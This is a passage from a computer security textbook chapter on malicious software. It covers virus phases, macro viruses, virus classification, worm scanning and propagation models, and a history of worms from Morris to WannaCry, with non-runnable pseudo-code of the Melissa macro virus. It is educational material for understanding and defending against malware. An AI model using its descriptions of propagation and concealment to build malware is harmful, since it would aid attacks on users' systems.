\\r\\nenabling it to replicate. The mechanism is also referred to as the infection vector.\\r\\n• Trigger: The event or condition that determines when the payload is activated \\r\\nor delivered, sometimes known as a logic bomb.\\r\\n• Payload: What the virus does, besides spreading. The payload may involve dam\\ufffeage or may involve benign but noticeable activity.\\r\\nDuring its lifetime, a typical virus goes through the following four phases:\\r\\n• Dormant phase:The virus is idle. The virus will eventually be activated by some \\r\\nevent, such as a date, the presence of another program or file, or the capacity of \\r\\nthe disk exceeding some limit. Not all viruses have this stage.\\r\\n• Propagation phase: The virus places a copy of itself into other programs or into \\r\\ncertain system areas on the disk. The copy may not be identical to the propagat\\ufffeing version; viruses often morph to evade detection. Each infected program will \\r\\nnow contain a clone of the virus, which will itself enter a propagation phase.\\r\\n• Triggering phase: The virus is activated to perform the function for which it was \\r\\nintended. As with the dormant phase, the triggering phase can be caused by a \\r\\nvariety of system events, including a count of the number of times that this copy \\r\\nof the virus has made copies of itself.\\r\\nM06_STAL0611_04_GE_C06.indd 211 10/11/17 2:51 PM\\n\\n\\n212 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\n• Execution phase: The function is performed. The function may be harmless, \\r\\nsuch as a message on the screen, or damaging, such as the destruction of pro\\ufffegrams and data files.\\r\\nMost viruses that infect executable program files carry out their work in a \\r\\nmanner that is specific to a particular operating system and, in some cases, specific \\r\\nto a particular hardware platform. Thus, they are designed to take advantage of the \\r\\ndetails and weaknesses of particular systems. Macro viruses however target specific \\r\\ndocument types, which are often supported on a variety of systems.\\r\\nOnce a virus has gained entry to a system by infecting a single program, it is in a \\r\\nposition to potentially infect some or all of the other files on that system with execut\\ufffeable content when the infected program executes, depending on the access permis\\ufffesions the infected program has. Thus, viral infection can be completely prevented by \\r\\nblocking the virus from gaining entry in the first place. Unfortunately, prevention is \\r\\nextraordinarily difficult because a virus can be part of any program outside a system. \\r\\nThus, unless one is content to take an absolutely bare piece of iron and write all one’s \\r\\nown system and application programs, one is vulnerable. Many forms of infection can \\r\\nalso be blocked by denying normal users the right to modify programs on the system.\\r\\nMacro and Scripting Viruses\\r\\nIn the mid-1990s, macro or scripting code viruses became by far the most prevalent \\r\\ntype of virus. NISTIR 7298 (Glossary of Key Information Security Terms, May 2013) \\r\\ndefines a macro virus as a virus that attaches itself to documents and uses the macro \\r\\nprogramming capabilities of the document’s application to execute and propagate. \\r\\nMacro viruses infect scripting code used to support active content in a variety of user \\r\\ndocument types. Macro viruses are particularly threatening for a number of reasons:\\r\\n1. A macro virus is platform independent. Many macro viruses infect active con\\ufffetent in commonly used applications, such as macros in Microsoft Word docu\\ufffements or other Microsoft Office documents, or scripting code in Adobe PDF \\r\\ndocuments. Any hardware platform and operating system that supports these \\r\\napplications can be infected.\\r\\n2. Macro viruses infect documents, not executable portions of code. Most of the \\r\\ninformation introduced onto a computer system is in the form of documents rather \\r\\nthan programs.\\r\\n3. Macro viruses are easily spread, as the documents they exploit are shared in nor\\ufffemal use. A very common method is by electronic mail, particularly since these \\r\\ndocuments can sometimes be opened automatically without prompting the user.\\r\\n4. Because macro viruses infect user documents rather than system programs, tra\\ufffeditional file system access controls are of limited use in preventing their spread, \\r\\nsince users are expected to modify them.\\r\\n5. Macro viruses are much easier to write or to modify than traditional execut\\ufffeable viruses.\\r\\nMacro viruses take advantage of support for active content using a scripting or macro \\r\\nlanguage, embedded in a word processing document or other type of file. Typically, \\r\\nusers employ macros to automate repetitive tasks and thereby save keystrokes. They \\r\\nM06_STAL0611_04_GE_C06.indd 212 10/11/17 2:51 PM\\n\\n\\n6.3 / PROPAGATION—INFECTED CONTENT—VIRUSES 213\\r\\nare also used to support dynamic content, form validation, and other useful tasks \\r\\nassociated with these documents.\\r\\nMicrosoft Word and Excel documents are common targets due to their wide\\ufffespread use. Successive releases of MS Office products provide increased protection \\r\\nagainst macro viruses. For example, Microsoft offers an optional Macro Virus Protec\\ufffetion tool that detects suspicious Word files and alerts the customer to the potential \\r\\nrisk of opening a file with macros. Office 2000 improved macro security by allowing \\r\\nmacros to be digitally signed by their author, and for authors to be listed as trusted. \\r\\nUsers were then warned if a document being opened contained unsigned, or signed \\r\\nbut untrusted, macros, and were advised to disable macros in this case. Various anti\\ufffevirus product vendors have also developed tools to detect and remove macro viruses. \\r\\nAs in other types of malware, the arms race continues in the field of macro viruses, \\r\\nbut they no longer are the predominant malware threat.\\r\\nAnother possible host for macro virus–style malware is in Adobe’s PDF docu\\ufffements. These can support a range of embedded components, including Javascript \\r\\nand other types of scripting code. Although recent PDF viewers include measures to \\r\\nwarn users when such code is run, the message the user is shown can be manipulated \\r\\nto trick them into permitting its execution. If this occurs, the code could potentially \\r\\nact as a virus to infect other PDF documents the user can access on their system. \\r\\nAlternatively, it can install a Trojan, or act as a worm, as we will discuss later [STEV11].\\r\\nMACRO VIRUS STRUCTURE Although macro languages may have a similar syntax, \\r\\nthe details depend on the application interpreting the macro, and so will always target \\r\\ndocuments for a specific application. For example, a Microsoft Word macro, including \\r\\na macro virus, will be different to an Excel macro. Macros can either be saved with \\r\\na document, or be saved in a global template or worksheet. Some macros are run \\r\\nautomatically when certain actions occur. In Microsoft Word, for example, macros \\r\\ncan run when Word starts, a document is opened, a new document is created, or when \\r\\na document is closed. Macros can perform a wide range of operations, not just only \\r\\non the document content, but can read and write files, and call other applications.\\r\\nAs an example of the operation of a macro virus, pseudo-code for the Melissa \\r\\nmacro virus is shown in Figure 6.1. This was a component of the Melissa e-mail worm \\r\\nthat we will describe further in the next section. This code would be introduced onto a \\r\\nsystem by opening an infected Word document, most likely sent by e-mail. This macro \\r\\ncode is contained in the Document_Open macro, which is automatically run when \\r\\nthe document is opened. It first disables the Macro menu and some related security \\r\\nfeatures, making it harder for the user stop or remove its operation. Next it checks to \\r\\nsee if it is being run from an infected document, and if so copies itself into the global \\r\\ntemplate file. This file is opened with every subsequent document, and the macro virus \\r\\nrun, infecting that document. It then checks to see if it has been run on this system \\r\\nbefore, by looking to see if a specific key “Melissa” has been added to the registry. If \\r\\nthat key is absent, and Outlook is the e-mail client, the macro virus then sends a copy \\r\\nof the current, infected document to each of the first 50 addresses in the current user’s \\r\\nAddress Book. It then creates the “Melissa” registry entry, so this is only done once on \\r\\nany system. Finally it checks the current time and date for a specific trigger condition, \\r\\nwhich if met results in a Simpson quote being inserted into the current document. \\r\\nOnce the macro virus code has finished, the document continues opening and the user \\r\\nM06_STAL0611_04_GE_C06.indd 213 10/11/17 2:51 PM\\n\\n\\n214 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\ncan then edit as normal. This code illustrates how a macro virus can manipulate both \\r\\nthe document contents, and access other applications on the system. It also shows two \\r\\ninfection mechanisms, the first infecting every subsequent document opened on the \\r\\nsystem, the second sending infected documents to other users via e-mail.\\r\\nMore sophisticated macro virus code can use stealth techniques such as encryp\\ufffetion or polymorphism, changing its appearance each time, to avoid scanning detection.\\r\\nViruses Classification\\r\\nThere has been a continuous arms race between virus writers and writers of anti-virus \\r\\nsoftware since viruses first appeared. As effective countermeasures are developed for \\r\\nexisting types of viruses, newer types are developed. There is no simple or universally \\r\\nagreed- upon classification scheme for viruses. In this section, we follow [AYCO06] \\r\\nand classify viruses along two orthogonal axes: the type of target the virus tries to \\r\\ninfect, and the method the virus uses to conceal itself from detection by users and \\r\\nanti-virus software.\\r\\nA virus classification by target includes the following categories:\\r\\n• Boot sector infector: Infects a master boot record or boot record and spreads \\r\\nwhen a system is booted from the disk containing the virus.\\r\\n• File infector: Infects files that the operating system or shell consider to be \\r\\nexecutable.\\r\\nmacro Document_Open\\r\\n disable Macro menu and some macro security features\\r\\n if called from a user document\\r\\n copy macro code into Normal template file\\r\\n else\\r\\n copy macro code into user document being opened\\r\\n end if\\r\\n if registry key “Melissa” not present\\r\\n if Outlook is email client\\r\\n for first 50 addresses in address book\\r\\n send email to that address\\r\\n with currently infected document attached\\r\\n end for\\r\\n end if\\r\\n create registry key “Melissa”\\r\\n end if\\r\\n if minute in hour equals day of month\\r\\n insert text into document being opened\\r\\n end if\\r\\nend macro\\r\\nFigure 6.1 Melissa Macro Virus Pseudo-code\\r\\nM06_STAL0611_04_GE_C06.indd 214 10/11/17 2:51 PM\\n\\n\\n6.4 / PROPAGATION—VULNERABILITY EXPLOIT—WORMS 215\\r\\n• Macro virus: Infects files with macro or scripting code that is interpreted by an \\r\\napplication.\\r\\n• Multipartite virus: Infects files in multiple ways. Typically, the multipartite virus \\r\\nis capable of infecting multiple types of files, so virus eradication must deal with \\r\\nall of the possible sites of infection.\\r\\nA virus classification by concealment strategy includes the following categories:\\r\\n• Encrypted virus: A form of virus that uses encryption to obscure it’s content. \\r\\nA portion of the virus creates a random encryption key and encrypts the remain\\ufffeder of the virus. The key is stored with the virus. When an infected program is \\r\\ninvoked, the virus uses the stored random key to decrypt the virus. When the \\r\\nvirus replicates, a different random key is selected. Because the bulk of the \\r\\nvirus is encrypted with a different key for each instance, there is no constant \\r\\nbit pattern to observe.\\r\\n• Stealth virus: A form of virus explicitly designed to hide itself from detection by \\r\\nanti-virus software. Thus, the entire virus, not just a payload, is hidden. It may \\r\\nuse code mutation, compression, or rootkit techniques to achieve this.\\r\\n• Polymorphic virus: A form of virus that creates copies during replication that \\r\\nare functionally equivalent but have distinctly different bit patterns, in order to \\r\\ndefeat programs that scan for viruses. In this case, the “signature” of the virus \\r\\nwill vary with each copy. To achieve this variation, the virus may randomly insert \\r\\nsuperfluous instructions or interchange the order of independent instructions. \\r\\nA more effective approach is to use encryption. The strategy of the encryption \\r\\nvirus is followed. The portion of the virus that is responsible for generating keys \\r\\nand performing encryption/decryption is referred to as the mutation engine. The \\r\\nmutation engine itself is altered with each use.\\r\\n• Metamorphic virus: As with a polymorphic virus, a metamorphic virus mutates \\r\\nwith every infection. The difference is that a metamorphic virus rewrites itself \\r\\ncompletely at each iteration, using multiple transformation techniques, increas\\ufffeing the difficulty of detection. Metamorphic viruses may change their behavior \\r\\nas well as their appearance.\\r\\n6.4 PROPAGATION—VULNERABILITY EXPLOIT—WORMS\\r\\nThe next category of malware propagation concerns the exploit of software vulner\\ufffeabilities, such as those we will discuss in Chapters 10 and 11, which are commonly \\r\\nexploited by computer worms, and in hacking attacks on systems. A worm is a pro\\ufffegram that actively seeks out more machines to infect, and then each infected machine \\r\\nserves as an automated launching pad for attacks on other machines. Worm programs \\r\\nexploit software vulnerabilities in client or server programs to gain access to each new \\r\\nsystem. They can use network connections to spread from system to system. They can \\r\\nalso spread through shared media, such as USB drives or CD and DVD data disks. \\r\\nE-mail worms can spread in macro or script code included in documents attached to \\r\\nM06_STAL0611_04_GE_C06.indd 215 10/11/17 2:51 PM\\n\\n\\n216 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\ne-mail or to instant messenger file transfers. Upon activation, the worm may replicate \\r\\nand propagate again. In addition to propagation, the worm usually carries some form \\r\\nof payload, such as those we discuss later.\\r\\nThe concept of a computer worm was introduced in John Brunner’s 1975 SF \\r\\nnovel The Shockwave Rider. The first known worm implementation was done in \\r\\nXerox Palo Alto Labs in the early 1980s. It was nonmalicious, searching for idle sys\\ufffetems to use to run a computationally intensive task.\\r\\nTo replicate itself, a worm uses some means to access remote systems. These \\r\\ninclude the following, most of which are still seen in active use:\\r\\n• Electronic mail or instant messenger facility: A worm e-mails a copy of itself to \\r\\nother systems, or sends itself as an attachment via an instant message service, so \\r\\nthat its code is run when the e-mail or attachment is received or viewed.\\r\\n• File sharing: A worm either creates a copy of itself or infects other suitable files \\r\\nas a virus on removable media such as a USB drive; it then executes when the \\r\\ndrive is connected to another system using the autorun mechanism by exploit\\ufffeing some software vulnerability, or when a user opens the infected file on the \\r\\ntarget system.\\r\\n• Remote execution capability: A worm executes a copy of itself on another \\r\\nsystem, either by using an explicit remote execution facility or by exploiting a \\r\\nprogram flaw in a network service to subvert its operations (as we will discuss \\r\\nin Chapters 10 and 11).\\r\\n• Remote file access or transfer capability: A worm uses a remote file access or \\r\\ntransfer service to another system to copy itself from one system to the other, \\r\\nwhere users on that system may then execute it.\\r\\n• Remote login capability: A worm logs onto a remote system as a user and then \\r\\nuses commands to copy itself from one system to the other, where it then executes.\\r\\nThe new copy of the worm program is then run on the remote system where, in \\r\\naddition to any payload functions that it performs on that system, it continues to \\r\\npropagate.\\r\\nA worm typically uses the same phases as a computer virus: dormant, prop\\ufffeagation, triggering, and execution. The propagation phase generally performs the \\r\\nfollowing functions:\\r\\n• Search for appropriate access mechanisms on other systems to infect by exam\\ufffeining host tables, address books, buddy lists, trusted peers, and other similar \\r\\nrepositories of remote system access details; by scanning possible target host \\r\\naddresses; or by searching for suitable removable media devices to use.\\r\\n• Use the access mechanisms found to transfer a copy of itself to the remote \\r\\nsystem, and cause the copy to be run.\\r\\nThe worm may also attempt to determine whether a system has previously been \\r\\ninfected before copying itself to the system. In a multiprogramming system, it can also \\r\\ndisguise its presence by naming itself as a system process or using some other name \\r\\nthat may not be noticed by a system operator. More recent worms can even inject \\r\\ntheir code into existing processes on the system, and run using additional threads in \\r\\nthat process, to further disguise their presence.\\r\\nM06_STAL0611_04_GE_C06.indd 216 10/11/17 2:51 PM\\n\\n\\n6.4 / PROPAGATION—VULNERABILITY EXPLOIT—WORMS 217\\r\\nTarget Discovery\\r\\nThe first function in the propagation phase for a network worm is for it to search for \\r\\nother systems to infect, a process known as scanning or fingerprinting. For such worms, \\r\\nwhich exploit software vulnerabilities in remotely accessible network services, it must \\r\\nidentify potential systems running the vulnerable service, and then infect them. Then, \\r\\ntypically, the worm code now installed on the infected machines repeats the same \\r\\nscanning process, until a large distributed network of infected machines is created.\\r\\n[MIRK04] lists the following types of network address scanning strategies that \\r\\nsuch a worm can use:\\r\\n• Random: Each compromised host probes random addresses in the IP address \\r\\nspace, using a different seed. This technique produces a high volume of Internet \\r\\ntraffic, which may cause generalized disruption even before the actual attack \\r\\nis launched.\\r\\n• Hit-List:The attacker first compiles a long list of potential vulnerable machines. \\r\\nThis can be a slow process done over a long period to avoid detection that \\r\\nan attack is underway. Once the list is compiled, the attacker begins infecting \\r\\nmachines on the list. Each infected machine is provided with a portion of the list \\r\\nto scan. This strategy results in a very short scanning period, which may make \\r\\nit difficult to detect that infection is taking place.\\r\\n• Topological: This method uses information contained on an infected victim \\r\\nmachine to find more hosts to scan.\\r\\n• Local subnet: If a host can be infected behind a firewall, that host then looks \\r\\nfor targets in its own local network. The host uses the subnet address structure \\r\\nto find other hosts that would otherwise be protected by the firewall.\\r\\nWorm Propagation Model\\r\\nA well-designed worm can spread rapidly and infect massive numbers of hosts. It is \\r\\nuseful to have a general model for the rate of worm propagation. Computer viruses \\r\\nand worms exhibit similar self-replication and propagation behavior to biological \\r\\nviruses. Thus we can look to classic epidemic models for understanding computer \\r\\nvirus and worm propagation behavior. A simplified, classic epidemic model can be \\r\\nexpressed as follows:\\r\\ndI(t)\\r\\ndt = bI(t) S(t)\\r\\nwhere\\r\\nI(t) = number of individuals infected as of time t\\r\\nS(t) = number of susceptible individuals (susceptible to infection but not yet \\r\\ninfected) at time t\\r\\nb = infection rate\\r\\nN = size of the population, N = I(t) + S(t)\\r\\nFigure 6.2 shows the dynamics of worm propagation using this model. Propaga\\ufffetion proceeds through three phases. In the initial phase, the number of hosts increases \\r\\nM06_STAL0611_04_GE_C06.indd 217 10/11/17 2:51 PM\\n\\n\\n218 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\nexponentially. To see that this is so, consider a simplified case in which a worm is \\r\\nlaunched from a single host and infects two nearby hosts. Each of these hosts infects \\r\\ntwo more hosts, and so on. This results in exponential growth. After a time, infecting \\r\\nhosts waste some time attacking already infected hosts, which reduces the rate of \\r\\ninfection. During this middle phase, growth is approximately linear, but the rate of \\r\\ninfection is rapid. When most vulnerable computers have been infected, the attack \\r\\nenters a slow finish phase as the worm seeks out those remaining hosts that are dif\\ufffeficult to identify.\\r\\nClearly, the objective in countering a worm is to catch the worm in its slow start \\r\\nphase, at a time when few hosts have been infected.\\r\\nZou et al. [ZOU05] describe a model for worm propagation based on an analy\\ufffesis of network worm attacks at that time. The speed of propagation and the total \\r\\nnumber of hosts infected depend on a number of factors, including the mode of \\r\\npropagation, the vulnerability or vulnerabilities exploited, and the degree of similar\\ufffeity to preceding attacks. For the latter factor, an attack that is a variation of a recent \\r\\nprevious attack may be countered more effectively than a more novel attack. Zou’s \\r\\nmodel agrees closely with Figure 6.2.\\r\\nThe Morris Worm\\r\\nArguably, the earliest significant, and hence well-known, worm infection was released \\r\\nonto the Internet by Robert Morris in 1988 [ORMA03]. The Morris worm was \\r\\ndesigned to spread on UNIX systems and used a number of different techniques for \\r\\npropagation. When a copy began execution, its first task was to discover other hosts \\r\\nknown to this host that would allow entry from this host. The worm performed this \\r\\ntask by examining a variety of lists and tables, including system tables that declared \\r\\nwhich other machines were trusted by this host, users’ mail forwarding files, tables \\r\\nFigure 6.2 Worm Propagation Model\\r\\n0.2\\r\\n0\\r\\nSlow start phase\\r\\nFraction of\\r\\nhosts infected\\r\\nFraction of\\r\\nhosts not\\r\\ninfected\\r\\nTime\\r\\nFraction\\r\\n0.4\\r\\n0.6\\r\\n0.8\\r\\n1.0\\r\\nFast spread sphase Slow finish phase\\r\\nM06_STAL0611_04_GE_C06.indd 218 10/11/17 2:51 PM\\n\\n\\n6.4 / PROPAGATION—VULNERABILITY EXPLOIT—WORMS 219\\r\\nby which users gave themselves permission for access to remote accounts, and from \\r\\na program that reported the status of network connections. For each discovered host, \\r\\nthe worm tried a number of methods for gaining access:\\r\\n1. It attempted to log on to a remote host as a legitimate user. In this method, the \\r\\nworm first attempted to crack the local password file then used the discovered \\r\\npasswords and corresponding user IDs. The assumption was that many users \\r\\nwould use the same password on different systems. To obtain the passwords, the \\r\\nworm ran a password-cracking program that tried:\\r\\na. Each user’s account name and simple permutations of it.\\r\\nb. A list of 432 built-in passwords that Morris thought to be likely candidates1\\r\\n.\\r\\nc. All the words in the local system dictionary.\\r\\n2. It exploited a bug in the UNIX finger protocol, which reports the whereabouts of \\r\\na remote user.\\r\\n3. It exploited a trapdoor in the debug option of the remote process that receives \\r\\nand sends mail.\\r\\nIf any of these attacks succeeded, the worm achieved communication with the \\r\\noperating system command interpreter. It then sent this interpreter a short bootstrap \\r\\nprogram, issued a command to execute that program, and then logged off. The boot\\ufffestrap program then called back the parent program and downloaded the remainder \\r\\nof the worm. The new worm was then executed.\\r\\nA Brief History of Worm Attacks\\r\\nThe Melissa e-mail worm that appeared in 1998 was the first of a new generation of \\r\\nmalware that included aspects of virus, worm, and Trojan in one package [CASS01]. \\r\\nMelissa made use of a Microsoft Word macro embedded in an attachment, as we \\r\\ndescribed in the previous section. If the recipient opens the e-mail attachment, the \\r\\nWord macro is activated. Then it:\\r\\n1. Sends itself to everyone on the mailing list in the user’s e-mail package, propa\\ufffegating as a worm; and\\r\\n2. Does local damage on the user’s system, including disabling some security tools, \\r\\nand also copying itself into other documents, propagating as a virus; and\\r\\n3. If a trigger time was seen, it displayed a Simpson quote as its payload.\\r\\nIn 1999, a more powerful version of this e-mail virus appeared. This version \\r\\ncould be activated merely by opening an e-mail that contains the virus, rather than by \\r\\nopening an attachment. The virus uses the Visual Basic scripting language supported \\r\\nby the e-mail package.\\r\\nMelissa propagates itself as soon as it is activated (either by opening an e-mail \\r\\nattachment or by opening the e-mail) to all of the e-mail addresses known to the \\r\\ninfected host. As a result, whereas viruses used to take months or years to propa\\ufffegate, this next generation of malware could do so in hours. [CASS01] notes that it \\r\\n1\\r\\nThe complete list is provided at this book’s website.\\r\\nM06_STAL0611_04_GE_C06.indd 219 10/11/17 2:51 PM\\n\\n\\n220 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\ntook only three days for Melissa to infect over 100,000 computers, compared to the \\r\\nmonths it took the Brain virus to infect a few thousand computers a decade before. \\r\\nThis makes it very difficult for anti-virus software to respond to new attacks before \\r\\nmuch damage is done.\\r\\nThe Code Red worm first appeared in July 2001. Code Red exploits a security \\r\\nhole in the Microsoft Internet Information Server (IIS) to penetrate and spread. It also \\r\\ndisables the system file checker in Windows. The worm probes random IP addresses \\r\\nto spread to other hosts. During a certain period of time, it only spreads. It then initi\\ufffeates a denial-of-service attack against a government website by flooding the site with \\r\\npackets from numerous hosts. The worm then suspends activities and reactivates \\r\\nperiodically. In the second wave of attack, Code Red infected nearly 360,000 serv\\ufffeers in 14 hours. In addition to the havoc it caused at the targeted server, Code Red \\r\\nconsumed enormous amounts of Internet capacity, disrupting service [MOOR02].\\r\\nCode Red II is another distinct variant that first appeared in August 2001, \\r\\nand also targeted Microsoft IIS. It tried to infect systems on the same subnet as the \\r\\ninfected system. Also, this newer worm installs a backdoor, allowing a hacker to \\r\\nremotely execute commands on victim computers.\\r\\nThe Nimda worm that appeared in September 2001 also has worm, virus, and \\r\\nmobile code characteristics. It spread using a variety of distribution methods:\\r\\n• E-mail: A user on a vulnerable host opens an infected e-mail attachment; \\r\\nNimda looks for e-mail addresses on the host then sends copies of itself to \\r\\nthose addresses.\\r\\n• Windows shares: Nimda scans hosts for unsecured Windows file shares; it can \\r\\nthen use NetBIOS86 as a transport mechanism to infect files on that host in \\r\\nthe hopes that a user will run an infected file, which will activate Nimda on \\r\\nthat host.\\r\\n• Web servers: Nimda scans Web servers, looking for known vulnerabilities in \\r\\nMicrosoft IIS. If it finds a vulnerable server, it attempts to transfer a copy of \\r\\nitself to the server and infects it and its files.\\r\\n• Web clients: If a vulnerable Web client visits a Web server that has been infected \\r\\nby Nimda, the client’s workstation will become infected.\\r\\n• Backdoors: If a workstation was infected by earlier worms, such as “Code Red \\r\\nII,” then Nimda will use the backdoor access left by these earlier infections to \\r\\naccess the system.\\r\\nIn early 2003, the SQL Slammer worm appeared. This worm exploited a buffer \\r\\noverflow vulnerability in Microsoft SQL server. The Slammer was extremely compact \\r\\nand spread rapidly, infecting 90% of vulnerable hosts within 10 minutes. This rapid \\r\\nspread caused significant congestion on the Internet.\\r\\nLate 2003 saw the arrival of the Sobig.F worm, which exploited open proxy \\r\\nservers to turn infected machines into spam engines. At its peak, Sobig.F reportedly \\r\\naccounted for one in every 17 messages and produced more than one million copies \\r\\nof itself within the first 24 hours.\\r\\nMydoom is a mass-mailing e-mail worm that appeared in 2004. It followed the \\r\\ngrowing trend of installing a backdoor in infected computers, thereby enabling hack\\ufffeers to gain remote access to data such as passwords and credit card numbers. Mydoom \\r\\nM06_STAL0611_04_GE_C06.indd 220 10/11/17 2:51 PM\\n\\n\\n6.4 / PROPAGATION—VULNERABILITY EXPLOIT—WORMS 221\\r\\nreplicated up to 1,000 times per minute and reportedly flooded the Internet with 100 \\r\\nmillion infected messages in 36 hours.\\r\\nThe Warezov family of worms appeared in 2006 [KIRK06]. When the worm \\r\\nis launched, it creates several executables in system directories and sets itself to run \\r\\nevery time Windows starts by creating a registry entry. Warezov scans several types \\r\\nof files for e-mail addresses and sends itself as an e-mail attachment. Some variants \\r\\nare capable of downloading other malware, such as Trojan horses and adware. Many \\r\\nvariants disable security-related products and/or disable their updating capability.\\r\\nThe Conficker (or Downadup) worm was first detected in November 2008 and \\r\\nspread quickly to become one of the most widespread infections since SQL Slammer \\r\\nin 2003 [LAWT09]. It spread initially by exploiting a Windows buffer overflow vulner\\ufffeability, though later versions could also spread via USB drives and network file shares. \\r\\nRecently, it still comprised the second most common family of malware observed by \\r\\nSymantec [SYMA16], even though patches were available from Microsoft to close \\r\\nthe main vulnerabilities it exploits.\\r\\nIn 2010, the Stuxnet worm was detected, though it had been spreading quietly \\r\\nfor some time previously [CHEN11, KUSH13]. Unlike many previous worms, it delib\\ufffeerately restricted its rate of spread to reduce its chance of detection. It also targeted \\r\\nindustrial control systems, most likely those associated with the Iranian nuclear pro\\ufffegram, with the likely aim of disrupting the operation of their equipment. It supported \\r\\na range of propagation mechanisms, including via USB drives, network file shares, \\r\\nand using no less than four unknown, zero-day vulnerability exploits. Considerable \\r\\ndebate resulted from the size and complexity of its code, the use of an unprecedented \\r\\nfour zero-day exploits, and the cost and effort apparent in its development. There are \\r\\nclaims that it appears to be the first serious use of a cyberwarfare weapon against \\r\\na nation’s physical infrastructure. The researchers who analyzed Stuxnet noted that \\r\\nwhile they were expecting to find espionage, they never expected to see malware with \\r\\ntargeted sabotage as its aim. As a result, greater attention is now being directed at the \\r\\nuse of malware as a weapon by a number of nations.\\r\\nIn late 2011, the Duqu worm was discovered, which uses code related to that in \\r\\nStuxnet. Its aim is different, being cyber-espionage, though it appears to also target \\r\\nthe Iranian nuclear program. Another prominent, recent, cyber-espionage worm is \\r\\nthe Flame family, which was discovered in 2012 and appears to target Middle-Eastern \\r\\ncountries. Despite the specific target areas for these various worms, their infection \\r\\nstrategies have been so successful that they have been identified on computer systems \\r\\nin a very large number of countries, including on systems kept physically isolated \\r\\nfrom the general Internet. This reinforces the need for significantly improved coun\\ufffetermeasures to resist such infections.\\r\\nIn May 2017, the WannaCry ransomware attack spread extremely rapidly over a \\r\\nperiod of hours to days, infecting hundreds of thousands of systems belonging to both \\r\\npublic and private organisations in more than 150 countries (US-CERT Alert TA17-\\r\\n132A) [GOOD17]. It spread as a worm by aggressively scanning both local and random \\r\\nremote networks, attempting to exploit a vulnerability in the SMB file sharing service on \\r\\nunpatched Windows systems. This rapid spread was only slowed by the accidental activa\\ufffetion of a “kill-switch” domain by a UK security researcher, whose existence was checked \\r\\nfor in the initial versions of this malware. Once installed on infected systems, it also \\r\\nencrypted files, demanding a ransom payment to recover them, as we will discuss later.\\r\\nM06_STAL0611_04_GE_C06.indd 221 10/11/17 2:51 PM\\n\\n\\n222 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\nState of Worm Technology\\r\\nThe state of the art in worm technology includes the following:\\r\\n• Multiplatform: Newer worms are not limited to Windows machines but can \\r\\nattack a variety of platforms, especially the popular varieties of UNIX; or \\r\\nexploit macro or scripting languages supported in popular document types.\\r\\n• Multi-exploit: New worms penetrate systems in a variety of ways, using exploits \\r\\nagainst Web servers, browsers, e-mail, file sharing, and other network-based \\r\\napplications; or via shared media.\\r\\n• Ultrafast spreading: Exploit various techniques to optimize the rate of spread \\r\\nof a worm to maximize its likelihood of locating as many vulnerable machines \\r\\nas possible in a short time period.\\r\\n• Polymorphic: To evade detection, skip past filters, and foil real-time analysis, \\r\\nworms adopt virus polymorphic techniques. Each copy of the worm has new \\r\\ncode generated on the fly using functionally equivalent instructions and encryp\\ufffetion techniques.\\r\\n• Metamorphic: In addition to changing their appearance, metamorphic worms \\r\\nhave a repertoire of behavior patterns that are unleashed at different stages of \\r\\npropagation.\\r\\n• Transport vehicles: Because worms can rapidly compromise a large number \\r\\nof systems, they are ideal for spreading a wide variety of malicious payloads, \\r\\nsuch as distributed denial-of-service bots, rootkits, spam e-mail generators, and \\r\\nspyware.\\r\\n• Zero-day exploit: To achieve maximum surprise and distribution, a worm should \\r\\nexploit an unknown vulnerability that is only discovered by the general network \\r\\ncommunity when the worm is launched. In 2015, 54 zero-day exploits were \\r\\ndiscovered and exploited, significantly more than in previous years [SYMA16]. \\r\\nMany of these were in common computer and mobile software. Some, though, \\r\\nwere in common libraries and development packages, and some in industrial \\r\\ncontrol systems. This indicates the range of systems being targeted.\\r\\nMobile Code\\r\\nNIST SP 800-28 (Guidelines on Active Content and Mobile Code, March 2008) defines \\r\\nmobile code as programs (e.g., script, macro, or other portable instruction) that can \\r\\nbe shipped unchanged to a heterogeneous collection of platforms and executed with \\r\\nidentical semantics.\\r\\nMobile code is transmitted from a remote system to a local system then executed \\r\\non the local system without the user’s explicit instruction. Mobile code often acts as a \\r\\nmechanism for a virus, worm, or Trojan horse to be transmitted to the user’s worksta\\ufffetion. In other cases, mobile code takes advantage of vulnerabilities to perform its own\\r\\nexploits, such as unauthorized data access or root compromise. Popular vehicles for \\r\\nmobile code include Java applets, ActiveX, JavaScript, and VBScript. The most common \\r\\nmethods of using mobile code for malicious operations on local system are cross-site \\r\\nscripting, interactive and dynamic websites, e-mail attachments, and downloads from \\r\\nuntrusted sites or of untrusted software.\\r\\nM06_STAL0611_04_GE_C06.indd 222 10/11/17 2:51 PM\\n\\n\\n6.4 / PROPAGATION—VULNERABILITY EXPLOIT—WORMS 223\\r\\nMobile Phone Worms\\r\\nWorms first appeared on mobile phones with the discovery of the Cabir worm in \\r\\n2004, then Lasco and CommWarrior in 2005. These worms communicate through \\r\\nBluetooth wireless connections or via the multimedia messaging service (MMS). \\r\\nThe target is the smartphone, which is a mobile phone that permits users to install \\r\\nsoftware applications from sources other than the cellular network operator. All these \\r\\nearly mobile worms targeted mobile phones using the Symbian operating system. \\r\\nMore recent malware targets Android and iPhone systems. Mobile phone malware \\r\\ncan completely disable the phone, delete data on the phone, or force the device to \\r\\nsend costly messages to premium-priced numbers.\\r\\nThe CommWarrior worm replicates by means of Bluetooth to other phones \\r\\nin the receiving area. It also sends itself as an MMS file to numbers in the phone’s \\r\\naddress book and in automatic replies to incoming text messages and MMS messages. \\r\\nIn addition, it copies itself to the removable memory card and inserts itself into the \\r\\nprogram installation files on the phone.\\r\\nAlthough these examples demonstrate that mobile phone worms are possible, \\r\\nthe vast majority of mobile phone malware observed use trojan apps to install them\\ufffeselves [SYMA16].\\r\\nClient-Side Vulnerabilities and Drive-by-Downloads\\r\\nAnother approach to exploiting software vulnerabilities involves the exploit of bugs \\r\\nin user applications to install malware. A common technique exploits browser and \\r\\nplugin vulnerabilities so when the user views a webpage controlled by the attacker, \\r\\nit contains code that exploits the bug to download and install malware on the system \\r\\nwithout the user’s knowledge or consent. This is known as a drive-by-download and \\r\\nis a common exploit in recent attack kits. Multiple vulnerabilities in the Adobe Flash \\r\\nPlayer and Oracle Java plugins have been exploited by attackers over many years, to \\r\\nthe point where many browsers are now removing support for them. In most cases, this \\r\\nmalware does not actively propagate 